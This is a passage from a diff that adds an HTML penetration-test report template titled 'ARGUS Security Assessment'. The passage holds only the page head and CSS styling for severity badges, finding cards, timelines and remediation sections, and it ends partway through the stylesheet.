@@ -1,0 +1,3137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ARGUS Security Assessment · ARG-PT-2026-0619 · CONFIDENTIAL</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,300;9..144,400;9..144,600;9..144,700;9..144,900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+/* ═══════════════════════════════════════════════════════════════
+   ARGUS EDITORIAL WHITEPAPER — COMPLETE STYLESHEET
+   ARG-PT-2026-0619 · CONFIDENTIAL — CLIENT PRIVILEGED
+═══════════════════════════════════════════════════════════════ */
+
+/* ─── CSS CUSTOM PROPERTIES ─────────────────────────────────── */
+:root {
+  /* Severity Palette */
+  --sev-critical:     #C0392B;
+  --sev-critical-bg:  #fdf3f2;
+  --sev-critical-mid: #e74c3c;
+  --sev-high:         #D35400;
+  --sev-high-bg:      #fef5ee;
+  --sev-high-mid:     #e67e22;
+  --sev-medium:       #B7770D;
+  --sev-medium-bg:    #fefae9;
+  --sev-medium-mid:   #f39c12;
+  --sev-low:          #1A6B3C;
+  --sev-low-bg:       #f0faf4;
+  --sev-low-mid:      #27ae60;
+  --sev-info:         #1A5276;
+  --sev-info-bg:      #eaf4fb;
+  --sev-info-mid:     #2980b9;
+
+  /* Brand & Neutrals */
+  --brand:            #1C1C2E;
+  --brand-mid:        #2C2C4A;
+  --brand-accent:     #4A4A7A;
+  --accent-gold:      #B8960C;
+  --accent-rule:      #D4AF37;
+
+  /* Typography */
+  --ink:              #1A1A2E;
+  --ink-mid:          #2D2D44;
+  --ink-light:        #5A5A7A;
+  --ink-faint:        #9090AA;
+  --surface:          #FFFFFF;
+  --surface-warm:     #FAFAF7;
+  --surface-cool:     #F4F4F8;
+  --border:           #E2E2EA;
+  --border-strong:    #C8C8D8;
+
+  /* Spacing */
+  --gap-xs:  0.25rem;
+  --gap-sm:  0.5rem;
+  --gap-md:  1rem;
+  --gap-lg:  1.5rem;
+  --gap-xl:  2.5rem;
+  --gap-xxl: 4rem;
+
+  /* Typography Scale */
+  --fs-display: clamp(2.8rem, 6vw, 5rem);
+  --fs-h1:      clamp(1.8rem, 3.5vw, 2.8rem);
+  --fs-h2:      clamp(1.3rem, 2.5vw, 1.9rem);
+  --fs-h3:      clamp(1.05rem, 1.8vw, 1.3rem);
+  --fs-body:    0.9375rem;
+  --fs-small:   0.8125rem;
+  --fs-micro:   0.7rem;
+
+  /* Radius */
+  --r-sm:  3px;
+  --r-md:  6px;
+  --r-lg:  10px;
+  --r-xl:  16px;
+}
+
+/* ─── PRINT / PAGE SETUP ─────────────────────────────────────── */
+@page {
+  size: A4;
+  margin: 18mm 18mm 22mm 18mm;
+  @bottom-center {
+    content: "CONFIDENTIAL — CLIENT PRIVILEGED  ·  ARG-PT-2026-0619  ·  Page " counter(page) " of " counter(pages);
+    font-family: 'Inter', sans-serif;
+    font-size: 7pt;
+    color: #9090AA;
+    letter-spacing: 0.04em;
+  }
+}
+
+@media print {
+  * { -webkit-print-color-adjust: exact !important; print-color-adjust: exact !important; }
+  body { font-size: 9pt; background: white !important; }
+  .no-print { display: none !important; }
+  .page-break { page-break-before: always; break-before: page; }
+  .avoid-break { page-break-inside: avoid; break-inside: avoid; }
+  section { page-break-inside: avoid; }
+  .cover { page-break-after: always; }
+  a { color: inherit; text-decoration: none; }
+  .finding-card { page-break-inside: avoid; break-inside: avoid; }
+}
+
+/* ─── RESET & BASE ───────────────────────────────────────────── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html {
+  font-size: 16px;
+  -webkit-text-size-adjust: 100%;
+  scroll-behavior: smooth;
+}
+
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  font-size: var(--fs-body);
+  line-height: 1.7;
+  color: var(--ink);
+  background: var(--surface-warm);
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+
+/* ─── TYPOGRAPHY ─────────────────────────────────────────────── */
+.serif { font-family: 'Fraunces', 'Georgia', 'Times New Roman', serif; }
+
+h1, h2, h3, .display { font-family: 'Fraunces', serif; font-weight: 700; line-height: 1.15; }
+
+p { margin-bottom: 0.85em; }
+p:last-child { margin-bottom: 0; }
+
+strong { font-weight: 600; color: var(--ink-mid); }
+em { font-style: italic; color: var(--ink-light); }
+
+code, .mono {
+  font-family: 'JetBrains Mono', 'Fira Code', monospace;
+  font-size: 0.82em;
+  background: var(--surface-cool);
+  border: 1px solid var(--border);
+  border-radius: var(--r-sm);
+  padding: 0.1em 0.35em;
+  color: var(--ink-mid);
+}
+
+/* ─── PAGE WRAPPER ───────────────────────────────────────────── */
+.page-wrapper {
+  max-width: 900px;
+  margin: 0 auto;
+  background: var(--surface);
+  box-shadow: 0 0 60px rgba(0,0,0,0.08);
+}
+
+@media (max-width: 960px) {
+  .page-wrapper { max-width: 100%; box-shadow: none; }
+}
+
+/* ─── CONFIDENTIAL BANNER ────────────────────────────────────── */
+.confid-banner {
+  background: var(--brand);
+  color: #fff;
+  text-align: center;
+  font-size: var(--fs-micro);
+  font-weight: 600;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  padding: 0.55rem 1rem;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+
+.confid-banner span { color: var(--accent-gold); }
+
+/* ─── COVER PAGE ─────────────────────────────────────────────── */
+.cover {
+  min-height: 100vh;
+  display: grid;
+  grid-template-rows: auto 1fr auto;
+  background: var(--surface);
+  position: relative;
+  overflow: hidden;
+}
+
+.cover-top-rule {
+  height: 6px;
+  background: linear-gradient(90deg, var(--sev-critical) 0%, var(--sev-high) 25%, var(--sev-medium) 55%, var(--sev-low) 80%, var(--sev-info) 100%);
+}
+
+.cover-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 2.5rem 3.5rem 0;
+}
+
+.cover-logo {
+  font-family: 'Fraunces', serif;
+  font-size: 1.5rem;
+  font-weight: 900;
+  letter-spacing: -0.02em;
+  color: var(--brand);
+}
+
+.cover-logo span { color: var(--sev-critical); }
+
+.cover-classification {
+  font-size: var(--fs-micro);
+  font-weight: 700;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--sev-critical);
+  border: 1.5px solid var(--sev-critical);
+  padding: 0.35rem 0.85rem;
+  border-radius: var(--r-sm);
+}
+
+.cover-body {
+  padding: 3rem 3.5rem 2rem;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  position: relative;
+}
+
+.cover-eyebrow {
+  font-size: var(--fs-small);
+  font-weight: 600;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  color: var(--ink-faint);
+  margin-bottom: 1.2rem;
+}
+
+.cover-title {
+  font-family: 'Fraunces', serif;
+  font-size: var(--fs-display);
+  font-weight: 900;
+  line-height: 1.04;
+  color: var(--brand);
+  letter-spacing: -0.025em;
+  margin-bottom: 0.5rem;
+  max-width: 780px;
+}
+
+.cover-subtitle {
+  font-family: 'Fraunces', serif;
+  font-size: clamp(1rem, 2vw, 1.4rem);
+  font-weight: 300;
+  color: var(--ink-light);
+  margin-bottom: 2.5rem;
+  font-style: italic;
+  letter-spacing: 0.01em;
+}
+
+.cover-divider {
+  width: 60px;
+  height: 3px;
+  background: var(--accent-rule);
+  margin-bottom: 2.5rem;
+}
+
+.cover-meta-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 0;
+  border: 1px solid var(--border);
+  border-radius: var(--r-lg);
+  overflow: hidden;
+  max-width: 700px;
+  margin-bottom: 2.5rem;
+}
+
+.cover-meta-item {
+  padding: 1rem 1.4rem;
+  border-right: 1px solid var(--border);
+  background: var(--surface-warm);
+}
+.cover-meta-item:last-child { border-right: none; }
+
+.cover-meta-label {
+  font-size: var(--fs-micro);
+  font-weight: 700;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--ink-faint);
+  margin-bottom: 0.3rem;
+}
+
+.cover-meta-value {
+  font-size: 0.875rem;
+  font-weight: 600;
+  color: var(--ink);
+}
+
+.cover-badges {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  flex-wrap: wrap;
+}
+
+.badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+  font-size: var(--fs-small);
+  font-weight: 700;
+  letter-spacing: 0.05em;
+  text-transform: uppercase;
+  padding: 0.45rem 1rem;
+  border-radius: var(--r-md);
+}
+
+.badge-critical { background: var(--sev-critical); color: #fff; }
+.badge-high     { background: var(--sev-high);     color: #fff; }
+.badge-medium   { background: var(--sev-medium);   color: #fff; }
+.badge-low      { background: var(--sev-low);      color: #fff; }
+.badge-info     { background: var(--sev-info);     color: #fff; }
+.badge-outcome  { background: var(--brand); color: var(--accent-gold); border: 1.5px solid var(--brand-accent); }
+.badge-outline  { background: transparent; color: var(--ink); border: 1.5px solid var(--border-strong); }
+.badge-verified { background: var(--sev-low-bg); color: var(--sev-low); border: 1px solid var(--sev-low-mid); }
+.badge-open     { background: var(--sev-medium-bg); color: var(--sev-medium); border: 1px solid var(--sev-medium-mid); }
+
+.cover-footer-bar {
+  padding: 1.8rem 3.5rem;
+  border-top: 1px solid var(--border);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background: var(--surface-cool);
+}
+
+.cover-footer-left { font-size: var(--fs-small); color: var(--ink-light); }
+.cover-footer-right { font-size: var(--fs-micro); color: var(--ink-faint); letter-spacing: 0.08em; text-align: right; }
+
+/* ─── SECTION WRAPPER ────────────────────────────────────────── */
+.section {
+  padding: 3.5rem 3.5rem 2.5rem;
+  border-bottom: 1px solid var(--border);
+  position: relative;
+}
+
+.section:last-child { border-bottom: none; }
+
+.section-alt { background: var(--surface-warm); }
+.section-dark { background: var(--brand); color: #eee; }
+
+/* ─── SECTION HEADERS ────────────────────────────────────────── */
+.section-numeral {
+  font-family: 'Fraunces', serif;
+  font-size: clamp(3.5rem, 8vw, 7rem);
+  font-weight: 900;
+  line-height: 1;
+  color: var(--border);
+  position: absolute;
+  top: 1.2rem;
+  right: 3rem;
+  pointer-events: none;
+  user-select: none;
+  letter-spacing: -0.04em;
+}
+
+.section-label {
+  font-size: var(--fs-micro);
+  font-weight: 700;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--ink-faint);
+  margin-bottom: 0.5rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+
+.section-label::before {
+  content: '';
+  display: inline-block;
+  width: 20px;
+  height: 2px;
+  background: var(--accent-rule);
+}
+
+.section-title {
+  font-family: 'Fraunces', serif;
+  font-size: var(--fs-h1);
+  font-weight: 700;
+  color: var(--brand);
+  line-height: 1.15;
+  margin-bottom: 0.4rem;
+  letter-spacing: -0.02em;
+}
+
+.section-lead {
+  font-size: 1.05rem;
+  font-weight: 400;
+  color: var(--ink-light);
+  max-width: 680px;
+  margin-bottom: 2rem;
+  line-height: 1.65;
+  font-style: italic;
+}
+
+.section-rule {
+  width: 40px;
+  height: 2px;
+  background: var(--accent-rule);
+  margin-bottom: 2rem;
+}
+
+/* ─── STAT TILES ─────────────────────────────────────────────── */
+.stat-row {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
+  gap: var(--gap-md);
+  margin-bottom: 2.5rem;
+}
+
+.stat-tile {
+  border-radius: var(--r-lg);
+  padding: 1.2rem 1rem 1rem;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+  border: 1px solid transparent;
+}
+
+.stat-tile-critical { background: var(--sev-critical-bg); border-color: rgba(192,57,43,0.2); }
+.stat-tile-high     { background: var(--sev-high-bg);     border-color: rgba(211,84,0,0.2); }
+.stat-tile-medium   { background: var(--sev-medium-bg);   border-color: rgba(183,119,13,0.2); }
+.stat-tile-low      { background: var(--sev-low-bg);      border-color: rgba(26,107,60,0.2); }
+.stat-tile-info     { background: var(--sev-info-bg);     border-color: rgba(26,82,118,0.2); }
+.stat-tile-total    { background: var(--brand); border-color: var(--brand-mid); }
+.stat-tile-access   { background: var(--sev-critical); border-color: var(--sev-critical-mid); }
+
+.stat-num {
+  font-family: 'Fraunces', serif;
+  font-size: clamp(2rem, 4vw, 3rem);
+  font-weight: 900;
+  line-height: 1;
+  margin-bottom: 0.3rem;
+  letter-spacing: -0.03em;
+}
+
+.stat-tile-critical .stat-num { color: var(--sev-critical); }
+.stat-tile-high     .stat-num { color: var(--sev-high); }
+.stat-tile-medium   .stat-num { color: var(--sev-medium); }
+.stat-tile-low      .stat-num { color: var(--sev-low); }
+.stat-tile-info     .stat-num { color: var(--sev-info); }
+.stat-tile-total    .stat-num { color: #fff; }
+.stat-tile-access   .stat-num { color: #fff; font-size: 1.1rem; }
+
+.stat-label {
+  font-size: var(--fs-micro);
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+}
+
+.stat-tile-critical .stat-label { color: var(--sev-critical); }
+.stat-tile-high     .stat-label { color: var(--sev-high); }
+.stat-tile-medium   .stat-label { color: var(--sev-medium); }
+.stat-tile-low      .stat-label { color: var(--sev-low); }
+.stat-tile-info     .stat-label { color: var(--sev-info); }
+.stat-tile-total    .stat-label { color: rgba(255,255,255,0.7); }
+.stat-tile-access   .stat-label { color: rgba(255,255,255,0.8); }
+
+/* ─── SEVERITY BADGE (inline) ────────────────────────────────── */
+.sev {
+  display: inline-flex;
+  align-items: center;
+  font-size: 0.72rem;
+  font-weight: 700;
+  letter-spacing: 0.06em;
+  text-transform: uppercase;
+  padding: 0.2rem 0.55rem;
+  border-radius: var(--r-sm);
+  white-space: nowrap;
+}
+
+.sev-critical { background: var(--sev-critical); color: #fff; }
+.sev-high     { background: var(--sev-high);     color: #fff; }
+.sev-medium   { background: var(--sev-medium);   color: #fff; }
+.sev-low      { background: var(--sev-low);      color: #fff; }
+.sev-info     { background: var(--sev-info);     color: #fff; }
+.sev-ne       { background: var(--surface-cool); color: var(--ink-light); border: 1px solid var(--border-strong); }
+
+/* ─── OUTCOME BADGE ──────────────────────────────────────────── */
+.outcome {
+  display: inline-flex;
+  align-items: center;
+  font-size: 0.7rem;
+  font-weight: 600;
+  padding: 0.18rem 0.5rem;
+  border-radius: 20px;
+  white-space: nowrap;
+}
+
+.outcome-success   { background: #e8f5e9; color: #2e7d32; border: 1px solid #a5d6a7; }
+.outcome-exploit   { background: var(--sev-critical-bg); color: var(--sev-critical); border: 1px solid rgba(192,57,43,0.25); }
+.outcome-failed    { background: var(--surface-cool); color: var(--ink-faint); border: 1px solid var(--border); }
+.outcome-blocked   { background: var(--sev-info-bg); color: var(--sev-info); border: 1px solid rgba(26,82,118,0.25); }
+.outcome-medium    { background: var(--sev-medium-bg); color: var(--sev-medium); border: 1px solid rgba(183,119,13,0.25); }
+
+/* ─── TABLES ─────────────────────────────────────────────────── */
+.data-table-wrap { overflow-x: auto; margin: 1.5rem 0; border-radius: var(--r-lg); border: 1px solid var(--border); }
+
+.data-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: var(--fs-small);
+  background: var(--surface);
+}
+
+.data-table thead tr {
+  background: var(--brand);
+  color: #fff;
+}
+
+.data-table thead th {
+  padding: 0.8rem 1rem;
+  text-align: left;
+  font-size: var(--fs-micro);
+  font-weight: 700;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  white-space: nowrap;
+}
+
+.data-table tbody tr { border-bottom: 1px solid var(--border); }
+.data-table tbody tr:last-child { border-bottom: none; }
+.data-table tbody tr:nth-child(even) { background: var(--surface-warm); }
+.data-table tbody tr:hover { background: var(--surface-cool); transition: background 0.15s; }
+
+.data-table tbody td {
+  padding: 0.75rem 1rem;
+  vertical-align: middle;
+  color: var(--ink-mid);
+}
+
+.data-table .col-id  { font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--ink-faint); font-weight: 500; }
+.data-table .col-cvss { font-weight: 700; }
+.data-table .col-mitre { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--ink-light); }
+
+/* ─── FINDING CARDS ──────────────────────────────────────────── */
+.finding-card {
+  border: 1px solid var(--border);
+  border-radius: var(--r-xl);
+  overflow: hidden;
+  margin-bottom: 1.8rem;
+  background: var(--surface);
+  box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+}
+
+.finding-card-header {
+  display: grid;
+  grid-template-columns: auto 1fr auto;
+  align-items: start;
+  gap: 1rem;
+  padding: 1.4rem 1.6rem;
+  border-bottom: 1px solid var(--border);
+}
+
+.finding-card-header-critical { border-left: 5px solid var(--sev-critical); }
+.finding-card-header-high     { border-left: 5px solid var(--sev-high); }
+.finding-card-header-medium   { border-left: 5px solid var(--sev-medium); }
+.finding-card-header-low      { border-left: 5px solid var(--sev-low); }
+.finding-card-header-info     { border-left: 5px solid var(--sev-info); }
+
+.finding-card-id {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.78rem;
+  font-weight: 700;
+  color: var(--ink-faint);
+  letter-spacing: 0.05em;
+  padding-top: 0.1rem;
+}
+
+.finding-card-title {
+  font-family: 'Fraunces', serif;
+  font-size: var(--fs-h3);
+  font-weight: 700;
+  color: var(--brand);
+  line-height: 1.2;
+  margin-bottom: 0.4rem;
+}
+
+.finding-card-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.5rem;
+  align-items: center;
+  margin-top: 0.4rem;
+  font-size: var(--fs-micro);
+  color: var(--ink-light);
+}
+
+.finding-card-cvss {
+  font-family: 'Fraunces', serif;
+  font-size: 1.6rem;
+  font-weight: 900;
+  line-height: 1;
+  text-align: right;
+}
+
+.finding-card-cvss-critical { color: var(--sev-critical); }
+.finding-card-cvss-high     { color: var(--sev-high); }
+.finding-card-cvss-medium   { color: var(--sev-medium); }
+.finding-card-cvss-low      { color: var(--sev-low); }
+
+.finding-card-body { padding: 1.4rem 1.6rem; }
+
+.finding-section-label {
+  font-size: var(--fs-micro);
+  font-weight: 700;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  color: var(--ink-faint);
+  margin-bottom: 0.4rem;
+  margin-top: 1rem;
+  padding-top: 1rem;
+  border-top: 1px solid var(--border);
+}
+
+.finding-section-label:first-child { margin-top: 0; padding-top: 0; border-top: none; }
+
+.finding-card-text { font-size: var(--fs-small); color: var(--ink-mid); line-height: 1.65; }
+
+.loot-block {
+  background: var(--brand);
+  border-radius: var(--r-md);
+  padding: 1rem 1.2rem;
+  margin-top: 0.6rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.76rem;
+  color: #c8ffc8;
+  line-height: 1.6;
+  word-break: break-all;
+}
+
+.loot-block .loot-key { color: #7eb8f7; }
+.loot-block .loot-redact { color: #ffc107; font-style: italic; }
+.loot-hash { font-size: 0.7rem; color: #888; margin-top: 0.4rem; }
+
+.remediation-block {
+  background: var(--sev-low-bg);
+  border: 1px solid rgba(26,107,60,0.2);
+  border-radius: var(--r-md);
+  padding: 0.9rem 1.1rem;
+  margin-top: 0.6rem;
+  font-size: var(--fs-small);
+  color: var(--sev-low);
+  line-height: 1.6;
+}
+
+/* ─── CALLOUT / HIGHLIGHT BOX ────────────────────────────────── */
+.callout {
+  border-radius: var(--r-lg);
+  padding: 1.3rem 1.6rem;
+  margin: 1.5rem 0;
+  border-left: 4px solid;
+  font-size: var(--fs-small);
+  line-height: 1.65;
+}
+
+.callout-critical { background: var(--sev-critical-bg); border-color: var(--sev-critical); color: #6b1511; }
+.callout-info     { background: var(--sev-info-bg);     border-color: var(--sev-info);     color: #1a3a55; }
+.callout-gold     { background: #fdf9ee; border-color: var(--accent-gold); color: #5a4800; }
+
+.callout-title { font-weight: 700; margin-bottom: 0.4rem; font-size: 0.82rem; letter-spacing: 0.06em; text-transform: uppercase; }
+
+/* ─── TWO-COLUMN LAYOUT ──────────────────────────────────────── */
+.two-col {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 2rem;
+}
+
+.two-col-60-40 { grid-template-columns: 60fr 40fr; }
+
+@media (max-width: 700px) {
+  .two-col, .two-col-60-40 { grid-template-columns: 1fr; }
+  .cover-meta-grid { grid-template-columns: 1fr; }
+  .stat-row { grid-template-columns: repeat(3, 1fr); }
+  .section { padding: 2.5rem 1.5rem; }
+  .cover-header, .cover-body, .cover-footer-bar { padding-left: 1.5rem; padding-right: 1.5rem; }
+}
+
+/* ─── SCOPE TABLE / SERVICE TABLE ────────────────────────────── */
+.service-row { display: flex; align-items: center; gap: 0.8rem; padding: 0.65rem 0; border-bottom: 1px solid var(--border); }
+.service-row:last-child { border-bottom: none; }
+.service-port { font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 0.82rem; color: var(--brand); min-width: 48px; }
+.service-name { font-size: var(--fs-small); font-weight: 600; color: var(--ink-mid); min-width: 160px; }
+.service-desc { font-size: var(--fs-small); color: var(--ink-light); }
+
+/* ─── PRIORITY ACTIONS ───────────────────────────────────────── */
+.action-list { list-style: none; margin-top: 0.8rem; }
+.action-item {
+  display: flex;
+  gap: 0.8rem;
+  align-items: flex-start;
+  padding: 0.75rem 0;
+  border-bottom: 1px solid var(--border);
+  font-size: var(--fs-small);
+}
+.action-item:last-child { border-bottom: none; }
+.action-num {
+  flex-shrink: 0;
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  background: var(--brand);
+  color: #fff;
+  font-size: 0.7rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-top: 0.1rem;
+}
+
+/* ─── TIMELINE ───────────────────────────────────────────────── */
+.timeline { position: relative; padding-left: 2.5rem; }
+.timeline::before {
+  content: '';
+  position: absolute;
+  left: 9px;
+  top: 0;
+  bottom: 0;
+  width: 2px;
+  background: var(--border);
+}
+
+.tl-item {
+  position: relative;
+  padding-bottom: 1.5rem;
+}
+
+.tl-item::before {
+  content: '';
+  position: absolute;
+  left: -2.07rem;
+  top: 4px;
+  width: 12px;
+  height: 12px;
+  border-radius: 50%;
+  background: var(--surface);
+  border: 2.5px solid var(--border-strong);
+}
+
+.tl-item.tl-critical::before { border-color: var(--sev-critical); background: var(--sev-critical-bg); }
+.tl-item.tl-success::before  { border-color: var(--sev-low-mid);  background: var(--sev-low-bg); }
+.tl-item.tl-high::before     { border-color: var(--sev-high);     background: var(--sev-high-bg); }
+
+.tl-time {
+  font-size: var(--fs-micro);
+  font-weight: 700;
+  color: var(--ink-faint);
+  letter-spacing: 0.08em;
+  margin-bottom: 0.1rem;
+}
+
+.tl-event { font-size: var(--fs-small); color: var(--ink-mid); font-weight: 500; }
+.tl-note  { font-size: var(--fs-micro); color: var(--ink-faint); margin-top: 0.15rem; }
+
+/* ─── REMEDIATION ROADMAP ────────────────────────────────────── */
+.remed-tier {
+  border-radius: var(--r-lg);
+  padding: 1.4rem 1.6rem;
+  margin-bottom: 1.2rem;
+  border: 1px solid transparent;
+}
+
+.remed-tier-p1 { background: var(--sev-critical-bg); border-color: rgba(192,57,43,0.2); }
+.remed-tier-p2 { background: var(--sev-high-bg);     border-color: rgba(211,84,0,0.2); }
+.remed-tier-p3 { background: var(--sev-info-bg);     border-color: rgba(26,82,118,0.15); }
+
+.remed-tier-header {
+  display: flex;
+  align-items: center;
+  gap: 0.8rem;
+  margin-bottom: 0.8rem;
+}
+
+.remed-tier-label {
+  font-family: 'Fraunces', serif;
+  font-size: 1.05rem;
+  font-weight: 700;
+}
+
+.remed-tier-p1 .remed-tier-label { color: var(--sev-critical); }
+.remed-tier-p2 .remed-tier-label { color: var(--sev-high); }
+.remed-tier-p3 .remed-tier-label { color: var(--sev-info); }
+
+.remed-items { list-style: none; }
+.remed-items li {
+  font-size: var(--fs-small);
+  color: var(--ink-mid);
+  padding: 0.3rem 0;
+  padding-left: 1.2rem;
+  position: relative;
+}
+.remed-items li::before {
+  content: '→';
+  position: absolute;
+  left: 0;
+  color: var(--ink-faint);
+}
+
+/* ─── DETECTION TABLE ────────────────────────────────────────── */
+.detect-table { width: 100%; border-collapse: collapse; font-size: var(--fs-small); }
+.detect-table th, .detect-table td { padding: 0.7rem 0.9rem; border-bottom: 1px solid var(--border); text-align: left; }
+.detect-table th { background: var(--surface-cool); font-size: var(--fs-micro); letter-spacing: 0.1em; text-transform: uppercase; color: var(--ink-faint); font-weight: 700; }
+.detect-table td:first-child { font-weight: 600; color: var(--ink-mid); }
+
+/* ─── MITRE MAP ──────────────────────────────────────────────── */
+.mitre-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+  gap: var(--gap-sm);
+  margin-top: var(--gap-md);
+}
+
+.mitre-cell {
+  background: var(--brand);
+  border-radius: var(--r-md);
+  padding: 0.8rem 1rem;
+  color: #fff;
+  font-size: var(--fs-micro);
+}
+
+.mitre-cell-phase {
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--accent-gold);
+  margin-bottom: 0.3rem;
+}
+
+.mitre-cell-tactic { font-size: 0.78rem; font-weight: 600; margin-bottom: 0.2rem; }
+.mitre-cell-id { font-family: 'JetBrains Mono', monospace; color: rgba(255,255,255,0.5); font-size: 0.7rem; }
+
+/* ─── EVIDENCE APPENDIX ──────────────────────────────────────── */
+.ev-item {
+  display: grid;
+  grid-template-columns: 60px 1fr 1fr 1fr;
+  gap: 0.8rem;
+  padding: 0.75rem 0;
+  border-bottom: 1px solid var(--border);
+  font-size: var(--fs-small);
+  align-items: center;
+}
+
+.ev-item:last-child { border-bottom: none; }
+.ev-id { font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--ink-faint); font-size: 0.78rem; }
+.ev-hash { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--ink-faint); }
+
+/* ─── LEGEND ─────────────────────────────────────────────────── */
+.legend {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.6rem;
+  margin-top: 1rem;
+}
+
+.legend-item {
+  display: flex;
+  align-items: center;
+  gap: 0.4rem;
+  font-size: var(--fs-micro);
+  font-weight: 600;
+  color: var(--ink-mid);
+}
+
+.legend-dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+
+/* ─── SVG CHART WRAPPERS ─────────────────────────────────────── */
+.chart-wrap {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--r-lg);
+  padding: 1.5rem;
+  display: flex;
+  flex-direction: column;
+  gap: 0.8rem;
+}
+
+.chart-title {
+  font-family: 'Fraunces', serif;
+  font-size: 0.95rem;
+  font-weight: 700;
+  color: var(--brand);
+  margin-bottom: 0.2rem;
+}
+
+/* ─── FOOTER ─────────────────────────────────────────────────── */
+.doc-footer {
+  background: var(--brand);
+  color: rgba(255,255,255,0.6);
+  text-align: center;
+  font-size: var(--fs-micro);
+  letter-spacing: 0.1em;
+  padding: 1.4rem 2rem;
+  line-height: 2;
+}
+
+.doc-footer strong { color: rgba(255,255,255,0.9); }
+.doc-footer .gold { color: var(--accent-gold); }
+
+/* ─── RETEST STATUS ──────────────────────────────────────────── */
+.retest-open     { color: var(--sev-medium); font-weight: 600; font-size: var(--fs-small); }
+.retest-verified { color: var(--sev-low);    font-weight: 600; font-size: var(--fs-small); }
+.retest-gated    { color: var(--ink-faint);  font-weight: 500; font-size: var(--fs-small); }
+
+/* ─── SAMPLE WATERMARK ───────────────────────────────────────── */
+.sample-tag {
+  display: inline-block;
+  font-size: var(--fs-micro);
+  font-weight: 700;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  border: 1.5px dashed var(--ink-faint);
+  color: var(--ink-faint);
+  padding: 0.2rem 0.6rem;
+  border-radius: var(--r-sm);
+  margin-left: 0.5rem;
+  vertical-align: middle;
+}
+
+/* ─── TOC ────────────────────────────────────────────────────── */
+.toc-list { list-style: none; margin-top: 1rem; }
+.toc-item {
+  display: flex;
+  align-items: baseline;
+  gap: 0;
+  padding: 0.45rem 0;
+  border-bottom: 1px dotted var(--border);
+}
+.toc-item:last-child { border-bottom: none; }
+.toc-num { font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--ink-faint); width: 28px; flex-shrink: 0; }
+.toc-text { font-size: 0.875rem; font-weight: 500; color: var(--ink-mid); flex: 1; }
+.toc-dots { flex: 1; border-bottom: 1px dotted var(--border); margin: 0 0.5rem; position: relative; top: -0.2rem; }
+.toc-page { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--ink-faint); }
+.toc-section-group { margin-bottom: 0.3rem; }
+.toc-section-head {
+  font-size: var(--fs-micro);
+  font-weight: 700;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  color: var(--ink-faint);
+  padding-top: 0.8rem;
+  margin-bottom: 0.2rem;
+}
+
+/* ─── KILL CHAIN SVG WRAPPER ─────────────────────────────────── */
+.killchain-wrap {
+  overflow-x: auto;
+  border-radius: var(--r-lg);
+  border: 1px solid var(--border);
+  background: var(--brand);
+  padding: 1.5rem;
+}
+
+/* ─── NOT-EXPLOITABLE SECTION ────────────────────────────────── */
+.ne-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+  gap: 1rem;
+  margin-top: 1rem;
+}
+
+.ne-card {
+  background: var(--surface-cool);
+  border: 1px solid var(--border);
+  border-radius: var(--r-md);
+  padding: 1rem 1.1rem;
+}
+
+.ne-card-title { font-weight: 600; font-size: var(--fs-small); color: var(--ink-mid); margin-bottom: 0.3rem; }
+.ne-card-reason { font-size: var(--fs-micro); color: var(--ink-faint); line-height: 1.5; }
+
+/* ─── SEPARATOR ──────────────────────────────────────────────── */
+.hr-styled {
+  border: none;
